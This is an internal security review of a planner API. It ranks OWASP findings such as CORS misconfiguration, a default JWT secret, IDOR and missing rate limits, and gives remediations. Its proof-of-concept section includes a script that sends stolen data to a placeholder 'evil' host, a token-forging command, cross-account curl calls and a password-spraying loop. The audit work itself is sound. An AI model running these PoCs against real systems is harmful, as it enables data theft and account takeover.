# Security Review — CentralIT Planner API (CEN-14)

- **Scope:** `apps/api` (`@centralit/api`) on branch `dev` at commit `ac9d138` — auth, projects, work-items REST surface, shared Zod schemas, Prisma layer.
- **Owner:** Security Reviewer.
- **Parent issue:** [CEN-7](/CEN/issues/CEN-7) · This review: [CEN-14](/CEN/issues/CEN-14) · API impl: [CEN-11](/CEN/issues/CEN-11).
- **Disposition:** **BLOCK merge `dev → main`** until all three CRITICAL findings are remediated.

---

## 1. Executive Summary

The MVP API is well-structured: Zod validators at every entry point, type-safe Fastify, central `HttpError` handler, hierarchical work-items with parent-type rules, JWT auth via `@fastify/jwt`. However, three CRITICAL gaps make the current `dev` branch unsafe to promote to `main`:

1. **C1 — CORS reflect-origin + credentials** lets *any* website send credentialed requests to the API.
2. **C2 — JWT secret has a hard-coded default** that passes `z.string().min(16)` and ships with `.env.example`. If `JWT_SECRET` is unset in production, every token is forgeable.
3. **C3 — No object-level authorization** on `/projects` and `/work-items`. Authentication ≠ authorization. Any logged-in user can read, mutate, or delete any other user's data (IDOR), and is the exact attack the brief calls out for `/work-items/:id`.

In addition, the auth flow lacks rate-limiting/lockout, bcrypt cost is below OWASP baseline, the work-item reparent allows cycle creation beyond direct self-parent, and Helmet CSP is disabled. Severity-ranked findings, PoCs, and concrete remediations are below.

---

## 2. STRIDE Threat Model

| STRIDE | Asset / Component | Threat | Status |
|---|---|---|---|
| **S**poofing | JWT-bearing identity | Token forgery via predictable/default `JWT_SECRET`; no MFA; no lockout | Open (C2, H1) |
| **T**ampering | Work items, projects, user attributes blob | IDOR write via direct `:id` access; unbounded `attributes` JSON | Open (C3, M5) |
| **R**epudiation | Mutating endpoints (POST/PATCH/DELETE) | No audit log of who changed what (only request log) | Open (M8) |
| **I**nformation disclosure | `/auth/register` 409, `/docs`, JWT payload, error messages | Email enumeration; OpenAPI schema unauth; PII (`email`) in JWT claim | Open (M2, M3, M7) |
| **D**enial of service | `/auth/*`, `/work-items/*`, request bodies | No rate-limit; no per-IP throttling; unbounded `attributes`; default 1MB body limit only | Open (H1, M5, L3) |
| **E**levation of privilege | Any authenticated user → tenant-wide admin | Missing ownership/membership model; JWT forge → any user | Open (C2, C3) |

Trust boundaries today:
```
[ browser  / 3rd-party site ]    CORS=*   credentials=true
            │
            ▼  Authorization: Bearer <JWT>
[ Fastify app ] ── helmet (CSP off) ── @fastify/jwt ── prisma ── PostgreSQL
            │
            └── Swagger UI at /docs (unauth)
```
There is **one** trust boundary: "has a valid JWT." Everything past that point is fully privileged across the entire dataset.

---

## 3. OWASP API Top 10 (2023) — Findings, Severity-Ranked

Severity scale: CRITICAL (block merge) · HIGH (fix this sprint) · MEDIUM (next sprint) · LOW (track).

### C1 — Broken CORS: reflect-origin + credentials allows cross-site credentialed requests
- **OWASP:** A05:2021 Security Misconfiguration · API8 Security Misconfiguration.
- **Where:** `apps/api/src/app.ts:80-83` and `apps/api/src/server.ts:11`.
- **Detail:** `corsOrigin: env.CORS_ORIGIN === '*' ? true : env.CORS_ORIGIN.split(',')...`. With `@fastify/cors`, `origin: true` reflects the request `Origin` header. Combined with `credentials: true`, the response sets `Access-Control-Allow-Origin: <attacker>` *and* `Access-Control-Allow-Credentials: true`. Any third-party site can issue credentialed XHR/fetch — and tokens stored in `localStorage` are not the only risk: if the frontend ever migrates to `httpOnly` cookies, this becomes drive-by full takeover. The default `.env.example` ships `CORS_ORIGIN="*"`.
- **PoC (attacker-controlled origin):**
  ```html
  <script>
  fetch('https://api.example.com/work-items', {
    credentials: 'include',
    headers: { Authorization: 'Bearer ' + leakedToken }
  }).then(r => r.json()).then(d => navigator.sendBeacon('https://evil/x', JSON.stringify(d)));
  </script>
  ```
- **Blast radius:** All authenticated endpoints from any origin in a browser context.
- **Fix:** Make `CORS_ORIGIN` required (no default), reject `*` when `credentials: true`, and pass a closed allow-list. Example:
  ```ts
  // env.ts
  CORS_ORIGIN: z.string().min(1).refine(v => v !== '*', 'CORS_ORIGIN=* is forbidden with credentials'),
  // app.ts
  await app.register(cors, {
    origin: opts.corsOrigin, // string[] only
    credentials: true,
    methods: ['GET','POST','PATCH','DELETE','OPTIONS'],
  });
  ```
- **Residual risk:** Misconfigured allow-list still possible; mitigate with deploy-time check.

### C2 — JWT secret has a built-in default that passes validation
- **OWASP:** A02:2021 Cryptographic Failures · A05 Security Misconfiguration · API2 Broken Authentication.
- **Where:** `apps/api/src/env.ts:8` — `JWT_SECRET: z.string().min(16).default('development-secret-please-change')`. `.env.example` ships `JWT_SECRET="dev-only-secret-change-me-in-prod"`.
- **Detail:** If `JWT_SECRET` is not set in the production environment, `loadEnv()` silently substitutes the literal default. The default is a known public string (committed to the repo), so any HS256 token signed with it is trivially forgeable. The 7d expiry + no revocation = full account takeover for a week per leak.
- **PoC:**
  ```bash
  node -e "
  const jwt=require('jsonwebtoken');
  console.log(jwt.sign({sub:'<any-user-uuid>',email:'a@b'},'development-secret-please-change',{expiresIn:'7d'}));
  "
  curl -H "Authorization: Bearer <token>" https://api.example.com/auth/me
  ```
- **Blast radius:** Total compromise of every authenticated endpoint, every user, until secret rotation.
- **Fix:** Remove the default — fail closed.
  ```ts
  JWT_SECRET: z.string().min(32, 'JWT_SECRET must be ≥32 chars and never defaulted'),
  ```
  Add a startup assertion: `if (env.NODE_ENV === 'production' && env.JWT_SECRET.includes('change')) throw new Error('refusing weak JWT_SECRET');`. Document rotation procedure. Consider migrating to asymmetric (RS256/EdDSA) so verifiers can be split from signers.
- **Residual risk:** Stolen runtime secret still allows forgery — pair with secret manager + rotation.

### C3 — Missing object-level authorization (IDOR) on `/work-items/:id` and `/projects/*`
- **OWASP:** A01:2021 Broken Access Control · API1 BOLA.
- **Where:** `apps/api/src/routes/workItems.ts` (GET/PATCH/DELETE/move `/:id`, list, create) and `apps/api/src/routes/projects.ts` (full CRUD). `preHandler: requireAuth` checks *only* token validity; no ownership/membership check anywhere.
- **Detail:** The data model (`apps/api/prisma/schema.prisma`) has no concept of project membership, team, or ownership. `User` only relates to `WorkItem` via optional `assigneeId`. Any authenticated user holds tenant-wide read/write/delete. The task brief explicitly calls out `/work-items/:id` IDOR — confirmed.
- **PoC:**
  ```bash
  # User A creates a work item
  curl -s -X POST $API/work-items -H "Authorization: Bearer $A_TOK" \
    -H 'content-type: application/json' \
    -d '{"kind":"task","title":"private","projectId":"'$PROJ'"}' | jq -r .id
  # → <ITEM_ID>

  # User B (different account) reads, edits, and deletes it
  curl -X GET    $API/work-items/$ITEM_ID -H "Authorization: Bearer $B_TOK"
  curl -X PATCH  $API/work-items/$ITEM_ID -H "Authorization: Bearer $B_TOK" \
    -d '{"title":"owned"}' -H 'content-type: application/json'
  curl -X DELETE $API/work-items/$ITEM_ID -H "Authorization: Bearer $B_TOK"
  ```
- **Blast radius:** Cross-tenant read, modify, and destroy of all projects and work items.
- **Fix (minimum for MVP):** Introduce a `ProjectMembership(userId, projectId, role)` table; on every project/work-item handler, resolve membership for `req.user.sub` and the target record's `projectId`; return `403 FORBIDDEN` on missing membership. List endpoints must filter by member project IDs. Recommended pattern:
  ```ts
  async function assertProjectAccess(prisma, userId, projectId, min: 'reader'|'writer') { /* throw forbidden() */ }
  ```
  Call from create (using body `projectId`), and from GET/PATCH/DELETE/move after fetching the item to resolve its `projectId`. List endpoint: `where: { projectId: { in: memberProjectIds }, ... }`.
- **Residual risk:** Role escalation within a project requires further design (see M8 audit).

---

### H1 — No rate-limiting on `/auth/login` and `/auth/register`
- **OWASP:** API4 Unrestricted Resource Consumption · A07 Identification & Authentication Failures.
- **Where:** `apps/api/src/routes/auth.ts` and `apps/api/src/app.ts`. No `@fastify/rate-limit` plugin registered.
- **Detail:** Credential stuffing and password spraying are unconstrained. Combined with bcrypt cost 10 (H2) and `password: min(8)` only (H3), each attempt is cheap and exploitable. `/auth/register` can be flooded to create disposable accounts.
- **PoC:**
  ```bash
  while read pw; do
    curl -s -o /dev/null -w "%{http_code}\n" -X POST $API/auth/login \
      -H 'content-type: application/json' \
      -d "{\"email\":\"victim@x\",\"password\":\"$pw\"}"
  done < rockyou.txt | grep -c 200
  ```
- **Fix:** Add `@fastify/rate-limit` globally with stricter caps on `/auth/*`:
  ```ts
  await app.register(rateLimit, { max: 100, timeWindow: '1 minute' });
  // per-route override on auth routes:
  config: { rateLimit: { max: 5, timeWindow: '1 minute' } }
  ```
  Add per-account login throttling (e.g., 10 fail/15min → 423 Locked) and a captcha or proof-of-work after N failures.
- **Residual risk:** Distributed attackers across IPs — needs per-account counters in DB or Redis.

### H2 — bcrypt cost factor 10 is below OWASP 2023 baseline
- **OWASP:** A02 Cryptographic Failures · API8.
- **Where:** `apps/api/src/lib/password.ts:3` — `const ROUNDS = 10;`.
- **Detail:** OWASP Password Storage Cheat Sheet (2023) recommends bcrypt cost ≥ 12 (or migrate to argon2id). Cost 10 ≈ ~10× cheaper to crack offline given a hash dump.
- **Fix:** Set `ROUNDS = 12` minimum (re-benchmark on production hardware for ≥250ms). Prefer `argon2id` via `argon2` (memory-hard) with `memoryCost: 19456, timeCost: 2, parallelism: 1` per OWASP. Add silent rehash-on-login when the stored hash uses old params.
- **Residual risk:** None when paired with rate-limit + lockout.

### H3 — Password policy: `min(8)` only, no breach-list check, no complexity
- **OWASP:** A07 Identification & Authentication Failures.
- **Where:** `packages/shared/src/index.ts:124, 130` — `password: z.string().min(8).max(200)`.
- **Detail:** NIST 800-63B-compliant policy needs (a) min length ≥ 8, (b) rejection of known-breached passwords, (c) no composition rules but check against common-password list. Currently any 8-char string passes.
- **Fix:** Add a startup-loaded HIBP top-100k bloom filter (or query the HIBP range API at register/change with k-anonymity), reject on hit. Length floor 12 for new users is reasonable.
- **Residual risk:** Phishing & reuse outside the app — out of scope.

### H4 — Reparent loop creation beyond direct self-parent
- **OWASP:** A04 Insecure Design.
- **Where:** `apps/api/src/routes/workItems.ts:282-296` and `apps/api/src/db/workItems.ts:84-118`.
- **Detail:** The move handler rejects `parentId === id` but does not walk the ancestor chain. A user can do `move(A → B)` then `move(B → A)` creating a cycle. Once cyclical, `WorkItem.children`/`parent` traversals (UI, future recursive queries) can infinite-loop, and `onDelete: SetNull` cannot resolve the cycle on delete.
- **PoC:**
  ```bash
  # given epics A, B both null parents
  curl -X POST $API/work-items/$A/move -H "Authorization: Bearer $T" -d '{"parentId":"'$B'"}'
  curl -X POST $API/work-items/$B/move -H "Authorization: Bearer $T" -d '{"parentId":"'$A'"}'
  # A↔B cycle now exists
  ```
  (Note: parent-type rules currently forbid EPIC→EPIC, so the practical exploit uses FEATURE↔FEATURE which is also forbidden — but USER_STORY can parent under FEATURE or EPIC, and TASK under USER_STORY/FEATURE/EPIC; chain `STORY1(parent=FEATURE) → STORY2(parent=STORY1)` is blocked by parent-type rules, so cycles via the existing rule table are limited. **However**, parent-type allowlist itself does not enforce acyclicity; a future relaxation or any same-type future kind would expose the bug. Fix is cheap.)
- **Fix:** Before calling `update`, walk parents from `newParentId` upward; if `itemId` is reached, throw `badRequest('cycle')`. Cap traversal at a depth (e.g., 50) to bound cost.
- **Residual risk:** Race condition on concurrent moves — wrap in serializable transaction or use a DB CHECK / recursive CTE constraint.

---

### M1 — Helmet CSP disabled
- **Where:** `apps/api/src/app.ts:79` — `helmet({ contentSecurityPolicy: false })`.
- **Detail:** API responses are JSON, but `/docs` (Swagger UI) renders HTML and loads remote assets. Default CSP would conflict with Swagger UI inline scripts — that's why it was disabled. Result: no `Content-Security-Policy` header anywhere; XSS in any future browser-rendered surface is unmitigated.
- **Fix:** Keep CSP on for everything except `/docs`. Register two helmet instances (one with strict CSP for API, one with relaxed for `/docs`) or use `app.addHook('onRequest')` to set a strict CSP on non-`/docs` paths.

### M2 — Email enumeration via `/auth/register` 409
- **Where:** `apps/api/src/routes/auth.ts:33` — distinct 409 "Email already registered" vs 400/201 for new email.
- **Fix:** Return a generic 202 "If the address is new, you'll receive a confirmation" + send email out-of-band (verification flow). For an MVP without email, at minimum harmonize timing and return the same 201/422 shape regardless.

### M3 — Swagger UI `/docs` exposed without authentication
- **Where:** `apps/api/src/app.ts:113-116`.
- **Detail:** Schema disclosure (full route inventory + DTOs) aids attackers. Acceptable in dev, risky in prod.
- **Fix:** Gate `/docs` behind `app.requireAuth` (or basic-auth) in `NODE_ENV === 'production'`; or only register Swagger UI when `env.ENABLE_DOCS === 'true'`.

### M4 — JWT lifetime 7d default, no refresh / rotation / revocation
- **Where:** `env.ts:9`, `app.ts:73,86`.
- **Detail:** Stolen token = 7 days of access. No `jti`, no server-side blacklist, no refresh.
- **Fix:** Short-lived access token (15m) + refresh token rotation (HttpOnly cookie, server-stored, revocable via session row), or at minimum a per-user `tokenVersion` column bumped on logout/password change and checked in `requireAuth`.

### M5 — `attributes: Json` is unbounded
- **Where:** `packages/shared/src/index.ts:29,44,55` — `z.record(z.string(), z.unknown())`. Stored as `Json @db.JsonB` in `WorkItem`.
- **Detail:** No max key count, no max string length, no max depth. Combined with default Fastify body limit (1MB), a single PATCH can store an 800KB nested blob per work item; abusable for storage exhaustion (DoS). Also: `unknown` content reaches the UI verbatim — if the frontend ever renders `attributes.*` as HTML, it becomes stored XSS.
- **Fix:** Schema-constrain `attributes`:
  ```ts
  z.record(z.string().max(64), z.union([z.string().max(2000), z.number(), z.boolean(), z.null()]))
   .refine(o => Object.keys(o).length <= 50, 'too many keys')
  ```
  Optionally model it as `z.discriminatedUnion` for known fields. Add `app.register(import('@fastify/sensible'))` and cap body via `bodyLimit: 256_000`.

### M6 — Request/response logging may capture credentials
- **Where:** `apps/api/src/app.ts:52-67` — pino logger, `disableRequestLogging: false`, no `redact` config.
- **Detail:** Fastify default request logger does not log bodies, but a future hook (or pino-pretty dev console with body printing) will, and `Authorization` headers are logged on errors.
- **Fix:** Add pino redact:
  ```ts
  logger: { redact: { paths: ['req.headers.authorization','req.body.password','req.body.passwordHash'], remove: true } }
  ```

### M7 — JWT payload leaks email (PII)
- **Where:** `apps/api/src/routes/auth.ts:39,68` — `reply.jwtSign({ sub, email })`.
- **Detail:** Anyone with the token (logs, browser devtools, error reports) reads the email. JWTs are base64, not encrypted.
- **Fix:** Sign only `{ sub }`. Look up email server-side when needed (already done in `/auth/me`).

### M8 — No audit trail of mutating actions
- **OWASP:** A09 Security Logging & Monitoring Failures.
- **Detail:** No `audit_log` table or structured log of `who performed what action against which resource`. After IDOR fix (C3), still no detection of insider misuse.
- **Fix:** Append an `audit_events` row from each mutating handler (or via a Prisma middleware): `{ actorId, action, resourceType, resourceId, before, after, ts, requestId }`.

---

### L1 — 7d JWT with no refresh (overlap with M4)
Already covered by M4; leaving as L1 for tracking.

### L2 — No explicit HSTS / referrer policy configuration
- **Where:** `app.ts:79`. Helmet defaults apply but are not pinned to a version-locked policy.
- **Fix:** Pass an explicit helmet config: `hsts: { maxAge: 31536000, includeSubDomains: true, preload: true }`, `referrerPolicy: { policy: 'no-referrer' }`.

### L3 — No body size limit override
- **Where:** Default Fastify body limit (1 MiB) applies. Acceptable, but document it and lower for the API surface that doesn't accept attachments (e.g., 256 KiB).

### L4 — Search `q` parameter LIKE pattern
- **Where:** `workItems.ts:52-58`, Prisma `contains` (parameterized).
- **Detail:** Safe from SQLi via Prisma; long `%`-only patterns can be expensive — already capped at 200 chars by Zod (`min(1).max(200)`). No change required; tracked as informational.

### L5 — ZodError `details` echoes validation path
- **Where:** `app.ts:128-134`. Returns `zErr.issues` which includes path/code; minor schema disclosure.
- **Fix (optional):** Strip to `{ path, code }` only in production, drop messages.

---

## 4. Validator + AuthZ Coverage Matrix

| Route | Method | Authn (`preHandler`) | Body schema | Params schema | Query schema | AuthZ check |
|---|---|---|---|---|---|---|
| `/health` | GET | — | — | — | — | n/a |
| `/auth/register` | POST | — | `registerSchema` ✓ | — | — | n/a |
| `/auth/login` | POST | — | `loginSchema` ✓ | — | — | n/a |
| `/auth/me` | GET | ✓ | — | — | — | n/a (self) |
| `/projects` | GET | ✓ | — | — | — | **MISSING** (C3) — returns all |
| `/projects` | POST | ✓ | `projectCreateSchema` ✓ | — | — | **MISSING** (C3) |
| `/projects/:id` | GET | ✓ | — | uuid ✓ | — | **MISSING** (C3) |
| `/projects/:id` | PATCH | ✓ | `projectUpdateSchema` ✓ | uuid ✓ | — | **MISSING** (C3) |
| `/projects/:id` | DELETE | ✓ | — | uuid ✓ | — | **MISSING** (C3) |
| `/work-items` | GET | ✓ | — | — | `workItemListQuerySchema` ✓ | **MISSING** (C3) — returns all |
| `/work-items` | POST | ✓ | `workItemCreateSchema` ✓ | — | — | **MISSING** (C3) — no project-member check |
| `/work-items/:id` | GET | ✓ | — | uuid ✓ | — | **MISSING** (C3) — **IDOR** |
| `/work-items/:id` | PATCH | ✓ | `workItemUpdateSchema` ✓ (allowlist OK) | uuid ✓ | — | **MISSING** (C3) — **IDOR** |
| `/work-items/:id` | DELETE | ✓ | — | uuid ✓ | — | **MISSING** (C3) — **IDOR** |
| `/work-items/:id/move` | POST | ✓ | `workItemMoveSchema` ✓ | uuid ✓ | — | **MISSING** (C3) + **H4 cycle** |
| `/docs` | GET | **—** | — | — | — | **MISSING** (M3) |

Mass-assignment posture is **OK**: `workItemUpdateSchema` is a *closed* partial allowlist (title, description, status, priority, assigneeId, attributes); `projectId`, `parentId`, `createdAt`, `id`, `updatedAt` are not patchable. `projectUpdateSchema` allows only `name` and `description`; `key` is immutable post-create. Good defensive posture.

Verdict on **"Verify Zod validators at every entry point"**: ✅ all bodies, params, and querystrings have Zod schemas wired through `fastify-type-provider-zod`.
Verdict on **"Verify auth/authorization on every protected route"**: ❌ authentication is present everywhere needed; **authorization is absent**.

---

## 5. Remediation Roadmap (Severity-Ordered)

**Block dev → main until done:**
- [ ] C1 — Reject `CORS_ORIGIN=*` when `credentials: true`; require explicit allow-list.
- [ ] C2 — Remove `JWT_SECRET` default in `env.ts`; require ≥32 chars; refuse known-default substrings in production.
- [ ] C3 — Add `ProjectMembership` model + `assertProjectAccess(userId, projectId, role)`; filter list endpoints by membership; add 403 path tests.

**This sprint (HIGH):**
- [ ] H1 — Register `@fastify/rate-limit` globally (e.g. 100/min) and per-auth-route (5/min); add account lockout counter.
- [ ] H2 — bcrypt rounds → 12 (or migrate to argon2id); rehash-on-login.
- [ ] H3 — Reject known-breached passwords (HIBP k-anonymity); raise min length to 12 for new registrations.
- [ ] H4 — Walk ancestor chain in `move` to reject cycles; cap depth.

**Next sprint (MEDIUM):**
- [ ] M1, M2, M3, M4, M5, M6, M7, M8.

**Track (LOW):**
- [ ] L2, L3, L5.

---

## 6. References

- OWASP Top 10 2021: A01, A02, A04, A05, A07, A09.
- OWASP API Security Top 10 (2023): API1 BOLA, API2 Broken Authentication, API4 Unrestricted Resource Consumption, API8 Security Misconfiguration.
- OWASP Password Storage Cheat Sheet (2023): bcrypt ≥ 12, argon2id preferred.
- NIST 800-63B §5.1.1.2 (memorized secret verifiers).
- MDN — `Access-Control-Allow-Credentials` interaction with `Access-Control-Allow-Origin: *`.
- `@fastify/cors` README — `origin: true` reflects the request `Origin`.
